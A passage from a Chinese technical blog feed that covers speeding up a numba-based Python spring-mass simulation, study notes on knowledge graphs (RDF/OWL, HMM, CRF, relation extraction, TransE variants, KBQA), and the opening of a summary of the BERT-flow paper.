hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 使用多线程</span><br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> ex:<br>    ex.map(simulate_spring_mass_funky_damper, np.arange(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">0.1</span>))<br></code></pre></div></td></tr></table></figure><p>当输入x0为从0到1000，每次增加0.1，需要19.3s。</p><p>再加速，利用多核，在矩阵运算时，关闭 GIL 锁：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@njit(nogil=True)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">friction_fn</span><span class="hljs-params">(v, vt)</span>:</span><br>    <span class="hljs-keyword">if</span> v &gt; vt:<br>        <span class="hljs-keyword">return</span> - v * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> - vt * <span class="hljs-number">3</span> * np.sign(v)<br><br><span class="hljs-meta">@njit(nogil=True)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">simulate_spring_mass_funky_damper</span><span class="hljs-params">(x0, T=<span class="hljs-number">10</span>, dt=<span class="hljs-number">0.0001</span>, vt=<span class="hljs-number">1.0</span>)</span>:</span><br>    times = np.arange(<span class="hljs-number">0</span>, T, dt)<br>    positions = np.zeros_like(times)<br>    <br>    v = <span class="hljs-number">0</span><br>    a = <span class="hljs-number">0</span><br>    x = x0<br>    positions[<span class="hljs-number">0</span>] = x0/x0<br>    <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> range(len(times)):<br>        <span class="hljs-keyword">if</span> ii == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        t = times[ii]<br>        a = friction_fn(v, vt) - <span class="hljs-number">100</span>*x<br>        v = v + a*dt<br>        x = x + v*dt<br>        positions[ii] = x/x0<br>    <span class="hljs-keyword">return</span> times, positions<br><br><span class="hljs-comment"># compile：先编译，那么使用时，省去了这段时间</span><br>_ = simulate_spring_mass_funky_damper(<span class="hljs-number">0.1</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> ex:<br>    ex.map(simulate_spring_mass_funky_damper, np.arange(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">0.1</span>))<br></code></pre></div></td></tr></table></figure><p>当输入x0为从0到1000，每次增加0.1，需要1.83s。</p><p>不使用多线程，使用numba自带的多进程并行，也是可以的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> prange<br><br><span class="hljs-meta">@njit(nogil=True, parallel=True)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_sims</span><span class="hljs-params">(end=<span class="hljs-number">1000</span>)</span>:</span><br>    <span class="hljs-keyword">for</span> x0 <span class="hljs-keyword">in</span> prange(int(end/<span class="hljs-number">0.1</span>)):<br>        <span class="hljs-keyword">if</span> x0 == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        simulate_spring_mass_funky_damper(x0*<span class="hljs-number">0.1</span>)<br>        <br>run_sims()<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅涉知识图谱</title>
      <link href="/posts/6a1e61f5.html"/>
      <url>/posts/6a1e61f5.html</url>
      
        <content type="html"><![CDATA[<h2><span id="基本概念">基本概念</span></h2><blockquote><p>“A knowledge graph consists of a set of interconnected typed entitiesand their attributes.”</p></blockquote><p>知识图谱由一些相互连接的实体和他们的属性构成的。是由一条条知识组成，每条知识表示为一个 SPO 三元组</p><p>技术体系简图：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222102729592.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h3><span id="spo相关">SPO相关</span></h3><p>SPO三元组：（实体，关系，实体），（实体，属性，字面量）</p><p>构建的难点之一就是，Schema设计。</p><blockquote><p>设计知识图谱的结构，要构建哪些类别的实体，实体有什么属性，实体间有什么关系，关系有什么属性</p></blockquote><h4><span id="spo的背后">SPO的背后</span></h4><p>RDF(Resource DescriptionFramework)，即资源描述框架，其本质是一个数据模型（DataModel）。RDF形式上表示为SPO三元组。</p><p>RDF由节点和边组成，节点表示实体/资源、属性，边则表示了实体和实体之间的关系以及实体和属性的关系。</p><p>RDF的表达能力有限，无法区分类和对象，也无法定义和描述类的关系/属性。就是不能反映一个类 的特征信息。</p><h4><span id="rdfsowl">RDFS/OWL</span></h4><p>用来描述RDF数据。RDFS/OWL序列化方式和RDF没什么不同，其实在表现形式上，它们就是RDF。</p><p>RDFS，即“Resource Description FrameworkSchema”，是最基础的模式语言。定义了类，将类进行抽象。</p><p>RDFS的表达能力还是相当有限，因此提出了OWL，Web OntologyLanguage。我们也可以把OWL当做是RDFS的一个扩展，其添加了额外的预定义词汇。</p><p>owl区分数据属性和对象属性（对象属性表示实体和实体之间的关系）。</p><p>OWL使用场景：本体结构中有大量相互链接的类和属性，设计者想用自动推理机得到里面复杂的关系。需要结合基于规则的推理引擎（rule-basedreasoning engine）的场合。</p><h2><span id="命名实体识别">命名实体识别</span></h2><h4><span id="概率图方法">概率图方法</span></h4><p>有向图</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222104606060.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>⽆向图</p><blockquote><p>概率⽆无向图模型，⼜称为⻢马尔可夫随机场</p><p>它假设随机场中任意⼀一个结点的赋值，仅仅和它的邻结点的取值有关，和不不相邻的结点的取值无关。⽆向图G中任何两个结点均有边连接的结点⼦集称为团。</p><p>若C是⽆向图的⼀个团，且不能再加进任何一个G的结点使其成为更大的⼀个团，则此C为最⼤团。</p><p>联合概率可以表示为其最大团C 随机变量的函数的乘积。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222104900473.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222104922327.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><blockquote><p>成对⻢马尔可夫性：没有直连边的任意两个节点是独立的。</p><p>局部⻢马尔可夫性：给定直连节点时，中心节点和其他节点条件独立。</p><p>全局⻢马尔可夫性：给定一个节点集合将全集划分为两个独立集合时，两个点集的任意子集，是相互独立的。</p></blockquote><h4><span id="hmm">HMM</span></h4><p>HMM是⽤用于描述由隐藏的状态序列列和显性的观测序列列组合⽽而成的双重随机过程。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222105818725.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>通过可观测到的数据，预测不不可观测到的状态数据。</p><blockquote><p>HMM的假设⼀：⻢马尔可夫性假设。当前时刻的状态值，仅依赖于前⼀时刻的状态值，⽽不依赖于更早时刻的状态值。</p><p>HMM的假设⼆：⻬次性假设。状态转移概率矩阵与时间⽆关。即所有时刻共享同⼀个状态转移矩阵。</p><p>HMM的假设三：观测独⽴立性假设。当前时刻的观察值，仅依赖于当前时刻的状态值。</p></blockquote><p>此处的问题是，预测隐状态序列（假设模型参数已经学习得到）。实例演示：</p><blockquote><p>已知：</p><p>状态值集合：{晴天，阴天，⾬雨天}；观测值集合：{宅，打球}；</p><p>过去状态值序列：{晴晴晴阴⾬雨晴}；对应观测值序列：{球宅宅球宅宅}；</p><p>从历史数据学习，已得到模型参数为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222110635113.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><p>求当观测序列是{宅球宅}，最有可能的天⽓状况序列？（动态规划求解概率最⼤大路路径）</p><p>求解过程：</p><blockquote><p>定义:</p><p>定义在时刻t状态为i的所有单个路径（i1，i2，... it)中的概率最大值为</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222111734674.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>t+1时刻的最大概率:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222111814599.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>再定义⼀个变量，⽤来回溯最⼤路径：在时刻t状态i的所有单个路径（i1，i2，，，it-1,it)中，概率最⼤的路路径第t-1个节点为（在t时刻选出上一个时刻的最优路径）：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222112025305.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p></blockquote><p>计算第一天</p><p><span class="math inline">\(\delta_1\)</span>（雨天）= <span class="math inline">\(\pi\)</span>(雨天) * B(雨天，宅) = 0.28</p><p><span class="math inline">\(\delta_1\)</span>（阴天）= <span class="math inline">\(\pi\)</span>(阴天) * B(阴天，宅) = 0.16</p><p><span class="math inline">\(\delta_1\)</span>（晴天）= <span class="math inline">\(\pi\)</span>(晴天) * B(晴天，宅) = 0.1</p><p>第二天</p><p><span class="math inline">\(\delta_2\)</span>（雨天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_1\)</span>(雨天) * A(雨天，雨天)， <span class="math inline">\(\delta_1\)</span>(阴天) * A(阴天，雨天)， <span class="math inline">\(\delta_1\)</span>(晴天) * A(晴天，雨天)]) *B(雨天，打球) = 0.042</p><p>​ 前一时刻选择，雨天</p><p><span class="math inline">\(\delta_2\)</span>（阴天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_1\)</span>(雨天) * A(雨天，阴天)， <span class="math inline">\(\delta_1\)</span>(阴天) * A(阴天，阴天)， <span class="math inline">\(\delta_1\)</span>(晴天) * A(晴天，阴天)]) *B(阴天，打球) = 0.0504</p><p>​ 前一时刻选择，雨天</p><p><span class="math inline">\(\delta_2\)</span>（晴天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_1\)</span>(雨天) * A(雨天，晴天)， <span class="math inline">\(\delta_1\)</span>(阴天) * A(阴天，晴天)， <span class="math inline">\(\delta_1\)</span>(晴天) * A(晴天，晴天)]) *B(晴天，打球) = 0.028</p><p>​ 前一时刻选择，雨天</p><p>第三天</p><p><span class="math inline">\(\delta_3\)</span>（雨天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_2\)</span>(雨天) * A(雨天，雨天)， <span class="math inline">\(\delta_2\)</span>(阴天) * A(阴天，雨天)， <span class="math inline">\(\delta_2\)</span>(晴天) * A(晴天，雨天)]) *B(雨天，打球) = 0.0147</p><p>​ 前一时刻选择，雨天</p><p><span class="math inline">\(\delta_3\)</span>（阴天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_2\)</span>(雨天) * A(雨天，阴天)， <span class="math inline">\(\delta_2\)</span>(阴天) * A(阴天，阴天)， <span class="math inline">\(\delta_2\)</span>(晴天) * A(晴天，阴天)]) *B(阴天，打球) = 0.01008</p><p>​ 前一时刻选择，阴天</p><p><span class="math inline">\(\delta_3\)</span>（晴天）= <span class="math inline">\(\max\)</span>( [<span class="math inline">\(\delta_2\)</span>(雨天) * A(雨天，晴天)， <span class="math inline">\(\delta_2\)</span>(阴天) * A(阴天，晴天)， <span class="math inline">\(\delta_2\)</span>(晴天) * A(晴天，晴天)]) *B(晴天，打球) = 0.00756</p><p>​ 前一时刻选择，阴天</p><p>最后，选择t3时刻最大路径，雨天。回溯结果为，{雨天，雨天，雨天}</p></blockquote><h5><span id="hmm的缺陷">HMM的缺陷</span></h5><ul><li>⻢尔可夫性（有限历史性）：实际上在NLP领域的文本数据，很多词语都是有⻓依赖的。</li><li>齐次性：序列列不同位置的状态转移矩阵可能会有所变化，即位置信息会影响预测结果。</li><li>观测独立性：观测值和观测值（字与字）之间是有相关性的。</li><li>单向图：只与前序状态有关，和后续状态无关。在NLP任务中，上下文的信息都是必须的。</li><li>标记偏置LabelBias：若状态A能够向N种状态转移，状态B能够向M种状态转移。若N&lt;&lt;M，则预测序列更有可能选择状态A，因为A的局部转移概率较大</li></ul><h4><span id="memm最大熵马尔可夫模型">MEMM最大熵马尔可夫模型</span></h4><p>解决了观测独立问题，但是依然存在标记偏置。</p><p>最大熵（熵：分布的不确定性）：</p><blockquote><p>“无知比错误更可取，一个什么都不相信的人比一个相信错误的人离真理更近”</p></blockquote><p>找到最优分布中，最偏向 uniform 的结果，即为最大熵的目标。</p><blockquote><p>H（x）=–∑x log x是凸函数</p></blockquote><p>最大熵模型的likeliihood形式为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222155638939.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>求导之后可以发现：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222160002751.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>MEMM：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222161015601.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>根据历史状态序列，预测当前状态，每一时间步，预测一个状态。</p><h4><span id="crf">CRF</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222161949260.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>在给定随机变量序列X的情况下，随机变量Y的条件概率分布P(Y|X)构成条件随机场，即满⾜足马尔可夫性：</p><p>P(Yi| X,Y1,Y2,...Yn) = P(Yi| X,Yi−1,Yi+1)</p><p>则称P(Y|X)为线性链条件随机场。</p><p>传统的CRF定义如下：</p><p>特征函数分为两类</p><ul><li>只和当前节点有关</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222163809742.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><ul><li>只和当前节点和上⼀个节点有关，局部特征函数</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222163856084.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>linear-CRF由 tk, λk, sl, µl 共同决定</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222163946006.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>i -- 表示从0到T的序列位置；k, l -- 表示自定义的特征函数编号。</p><p>在深度学习中使用时，用深度模型代替特征函数：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222164236336.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><h5><span id="crf相对于hmm的优点">CRF相对于HMM的优点</span></h5><ol type="1"><li>规避了马尔可夫性，能够获取长文本的远距离依赖的信息</li><li>规避了齐次性，并且序列的 位置信息会影响预测出的状态序列</li><li>规避了观测独立性，观测值之间的相关性信息能够被提取</li><li>不是单向图，而是无向图，能够充分提取上下文信息作为特 征</li><li>改善了标记偏置Label Bias问题</li><li>CRF的思路是利用多个特征，对状态序列进行预测。HMM的表现形式使他无法使⽤多个复杂特征</li></ol><h5><span id="crf的缺点">CRF的缺点</span></h5><ol type="1"><li>CRF训练代价大、复杂度高</li><li>需要人为构造特征函数，特征工程对CRF模型的影响很大</li></ol><h2><span id="实体连接">实体连接</span></h2><p>候选实体生成：根据输入文本中检测出的实体mention集合M，从给定知识图谱中找到可能属于M的候选实体集合m</p><p>候选实体排序： 负责对候选实体集合m中多个候选实体打分的排序，并输出得分最高的候选实体，作为实体链接结果</p><h2><span id="关系分类简介">关系分类简介</span></h2><p>关系抽取:从一个句子中判断两个entity是否有关系，一般是一个二分类问题，指定某种关系关系分类: 一般是判断一个句子中两个entity是哪种关系，属于多分类问题。</p><blockquote><p>标注工具: BRAT</p><p>BRAT是一个基于web的文本标注工具，主要用于对文本的结构化标注，用BRAT生成的标注结果能够把无结构化的原始文本结构化，供计算机处理。利用该工具可以方便的获得各项NLP任务需要的标注语料。</p></blockquote><p>方法：</p><ul><li>基于规则的方法——人工模板</li><li>基于规则的方法——基于统计的方法</li><li>基于监督学习的方法——CNN/RNN</li><li>基于监督学习的方法——PCNN</li><li>半监督学习的方法——自举</li><li>半监督学习的方法——远程监督</li></ul><h4><span id="基于统计的方法">基于统计的方法</span></h4><ol type="1"><li>输入关系集合中的一个</li><li>搜索一组实体对，满足关系</li><li>输入实体对，搜索包含实体对的句子，保存</li><li>将保存句子中的实体对，使用同一类关系模版替换</li><li>计算成功替换，模版匹配正确的比例，即概率，作为模版的得分（置信度）。留下得分高的模版</li></ol><h4><span id="神经网络方法">神经网络方法</span></h4><p>输入embedding，可加上相对位置embedding，训练分类器。</p><p>PCNN的<strong>Piecewise Convolutional</strong>，只是使用Piecewise maxpooling，从实体所在位置处，分段进行pooling。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222171941078.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><h4><span id="半监督">半监督</span></h4><h5><span id="bootstrapping">Bootstrapping</span></h5><ol type="1"><li><p>创建空的列表；</p></li><li><p>使用精心选择的种子初始化列表；</p></li><li><p>利用列表中的内容从训练语料库中查找更多内容；</p></li><li><p>给那些新发现的内容打分；把得分最高的内容加到列表中。</p></li><li><p>重复步骤3和4，直到达到最大迭代次数或者其它停止条件为止。</p></li></ol><p>Snowball优化了部分的细节</p><p>定义pattern 成为<em>&lt;left, tag1, middle, tag2, right&gt;</em>;tuples 为 &lt;tag1 , tag2&gt;</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222172633928.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>生成新pattern时，评估其与已有pattern的相似性，取一个阈值之上的，加入pattern集合。</p><p>tuples要经过可信度计算，选择可信度高的留下，计算方法看<a href="http://www.mathcs.emory.edu/~eugene/papers/dl00.pdf">论文</a>或者<a href="https://zhuanlan.zhihu.com/p/101058270">blog</a>吧。</p><h5><span id="远程监督">远程监督</span></h5><p>将已有的知识对应到丰富的非结构化语料中从而生成大量的训练数据。知识来源：人工标注、现有的知识库、特定的语句结构。</p><p>Distant supervised会产生有大量噪音或者被错误标注的数据，直接使用supervised的方法进行关系分类，效果很差。</p><h2><span id="知识表示embedding">知识表示Embedding</span></h2><h4><span id="transe">TransE</span></h4><p>TransE，⼀种将实体与关系嵌⼊到低维向量空间中的简单模型。该模型已经成为了知识 图谱向量化表示的baseline，并衍⽣出不同的变体。原理简述：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222174150117.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>h，t为实体向量，r为关系向量。</p><p>以L2 距离为例，梯度的计算相对⽐较简单，⽬标函数变为</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222174400473.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>求解导数：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222174449957.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222174524289.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>完整算法：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222174739168.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>评测方法：</p><blockquote><p>在测试时，以⼀个三元组为例，⽤语料中所有实体替换当前三元组的头实体计算距离d(h′+l,t)，将结果按升序排序，⽤正确三元组的排名情况来评估学习效果（同理对尾实体这样做）。(若替换到在训练集中的三元组，可以选择删掉)</p></blockquote><blockquote><p>度量标准选择hits@10和mean rank，前者代表命中前10的次数/总查询次数，后者代表 正确结果排名之和/总查询次数</p></blockquote><p>训练速度快、易于实现。另外，可以将word2vec和TransE一起融合训练，此处不作展开。</p><h4><span id="transh">TransH</span></h4><p>虽然 TransE模型具有训练速度快、易于实现等优点，但是它不能够解决多对⼀和⼀对多关系的问题。以多对⼀关系为例，固定 r 和 t，TransE模型为了满⾜三⻆闭包关系，训练出来的头节点的向量会很相似。⽽TransH是⼀种将头尾节点映射到关系平⾯的模型，能够很好地解决这⼀问题。</p><p>对于多对⼀关系，TransH 不在严格要求h+r-l=0，⽽是只需要保证头结点和尾节点在关系平⾯上的投影在⼀条直线上即可。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175358133.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175435542.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175455866.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h4><span id="transr">TransR</span></h4><p>TransE 和 TransH都假设实体和关系嵌⼊在相同的空间中。然⽽，⼀个实体是多种属性的综合体，不同关系对应实体的不同属性，即头尾节点和关系可能不在⼀个向量空间中。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175610493.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175643271.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222175711668.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h4><span id="transd">TransD</span></h4><p>TransR同样有它的问题，首先对于一种关系，它的头实体和尾实体使用同样的变换矩阵映射到关系空间，而头实体和尾实体往往是完全不同类的实体，也应该使用不同的方法进行映射。</p><p>TransD模型对每个实体或关系使用两个向量进行表示，一个向量表示语义，另一个（用下表p表示）用来构建映射矩阵。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222215144407.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222215235285.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><h2><span id="问答应用">问答应用</span></h2><h4><span id="基于知识图谱的问答kbqa">基于知识图谱的问答KBQA</span></h4><p>基本流程：</p><p>⾃然语⾔查询--&gt;意图识别(IntentionRecognition)--&gt;实体链指(Entity Linking)+关系识别(Relation Detection)--&gt; 查询语句拼装(Query Construction)--&gt;返回结果选择(AnsweringSelection)</p><blockquote><p>意图识别(IntentionRecognition)：预先准备好意图模板，可以通过相似度来匹配，也可以通过机器学习⾥的分类问题来解决，这个是所有问答系统都要⾯临的问题。</p><p>实体链指(Entity Linking)+关系识别(RelationDetection)：将查询语句中出现的实体和关系映射到知识图谱⾥，本质是⼀个NER问题，只是需要将NER结果进⼀步链接到图谱。</p><p>查询语句拼装(QueryConstruction)：需要根据底层知识图谱的查询语⾔，拼装成对应的query来查询(sparq等)，最简单的⽅法就是预先定义好查询模板，根据之前解析出来的<strong>(意图，实体，关系)</strong>填进模板查询即可。</p><p>返回结果选择(AnsweringSelection)：图谱查询之后的结果可能存在多个，需要选择⼀个最合适的答案，可以预先指定排序规则去选择答案。</p></blockquote><p>参考：</p><p>实例：<a href="https://github.com/beader/tianchi_nl2sql">NL2SQL比赛第三名方案</a>，待学习</p><h4><span id="基于知识表示的问答keqa">基于知识表示的问答KEQA</span></h4><p><a href="http://research.baidu.com/Public/uploads/5c1c9a58317b3.pdf">KEQA</a></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222181049264.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>KEQA的目标不是直接推断头部实体和谓词，而是联合恢复知识图嵌入空间中问题的头部实体、谓词和尾部实体表示(eh,p, et)。分别训练两个模型，一个学习 谓词p 和 实体e的表示，一个识别问题中到的Head实体。如下面两个图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222211314387.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/知识图谱整理_pic/image-20210222211327917.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>Entity Linking: FindingExtracted Entities in a Knowledge Base<a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Improved Neural RelationDetection for Knowledge Base Question Answering<a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relation extraction </tag>
            
            <tag> NER </tag>
            
            <tag> TransE </tag>
            
            <tag> Knowledge Graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BERT-flow and more</title>
      <link href="/posts/a954bb00.html"/>
      <url>/posts/a954bb00.html</url>
      
        <content type="html"><![CDATA[<h1><span id="论文on-the-sentence-embeddings-from-pre-trained-language-models">论文:On the Sentence Embeddings from Pre-trained Language Models</span></h1><p>Author: Bohan Li, Hao Zhou, Junxian He, Mingxuan Wang, Yiming Yang,Lei Li</p><p>Organization: ByteDance AI Lab; Language Technologies Institute,Carnegie Mellon University</p><hr><h2><span id="info">Info:</span></h2><ul><li><p>类别: BERT语义表示应用优化</p></li><li><p>研究目标：将原本BERT训练模式下生成的语义表示的各向异性空间，通过设计的无监督方法，转化为各向同性的语义表示空间。</p></li><li><p>研究成果：结合Flow basedmodel，使用无监督方式提升语义表示的效果。</p></li><li><p>存在的问题：按文章的思路，就是将BERT sentenceembedding做一个转化，从非正交（orthogonalspace）转化到正交的空间，以满足cossimilarity适用的条件，以提高效果。但是一定需要Flow based方法来实现吗？有没有更好的方法？</p></li><li><p>关键词：BERT；Flow based model；semantic similarity</p></li></ul><hr><h2><span id="brief-summary">Brief Summary:</span></h2><p>首先解释了直接基于BERT生成的sentenceembedding为什么其语义表达能力较差，然后提出一种在不引入更多监督数据条件下，提升其语义表达能力的方法，flowbased model。</p><hr><h2><span id="outline">Outline:</span></h2><ol type="1"><li>搞清楚BERT-induced sentence embedding的空间有什么特性</li><li>BERT-flow怎么设计的</li><li>[来自苏剑林的质疑]BERT-flow？没必要那么复杂，BERT-whitening更优雅</li></ol><hr><h2><span id="main-thought">Main Thought:</span></h2><p>首先是flow basedmodel在干什么，这首先是一个生成网络（以下图片内容来自李宏毅老师课程）：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210113230557038.png" srcset="/img/loading.gif" lazyload alt 